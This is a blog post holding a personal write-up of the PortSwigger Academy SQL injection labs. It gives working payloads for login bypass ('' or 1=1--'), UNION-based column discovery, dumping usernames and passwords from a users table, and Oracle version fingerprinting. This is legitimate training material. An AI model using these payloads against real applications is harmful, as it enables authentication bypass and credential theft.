---
layout: post
title: Portswigger Academy - SQL Injection
date: 2023-06-06 15:43:18 +0200
categories: [Portswigger Academy, SQL Injection]
tags: [SQL Injection, Write-up, Cheat Sheet]
---

## Info

This is my write-up for the *SQL Injection* learning path at the Portswigger Academy.\
The reason for this write-up is to have a cheat-sheet or some go-to notes for myself.\
Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of the hints.

[Portswigger Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)

## LAB : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This is an easy one. Just navigate to a category, and SQL Inject the GET query.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' OR 1=1--`

## LAB : SQL injection vulnerability allowing lobin bypass

This one can be done by passing a SQL Injection in the *password* field of the login form.

- Username: `administrator`
- Password: `' or 1=1--`

## LAB : SQL injection UNION attack, determining the number of columns returned by the query

This can also be done by injecting the SQL injection straight into the GET query of the URL.

First we need to check how many columns the original query returns, and match those.\
Start off with one *NULL* and keep adding until you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

Now we know we need to return 3 columns in our injection, we need to find a column that can contain a string.\
Again, start with trying the first column, and move further untill you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'abc',NULL--`


## LAB : SQL injection UNION attack, retrieving data from other tables

Building on the previous lab. First check how many columns we need to return:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--`

Check which columns can contain strings (and where you see the 1st column, and where the 2nd):\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'abc','xyz'--`

Now we can print all usernames with their passwords as a new item:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--`

## LAB : SQL injection attack, querying the database type and version on Oracle

Trying what we did in the previous 2 labs doesn't work here. No matter how many *NULL*s we add, we keep getting errors:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

That's because in this case there's no MS-SQL as backend. But an Oracle database (as suggested in the title of the lab)\
For Oracle DB's we have to do the following:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL FROM dual--`

Now that this doens't return an error, we can actually check which database type we are dealing with:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,banner FROM v$version--`



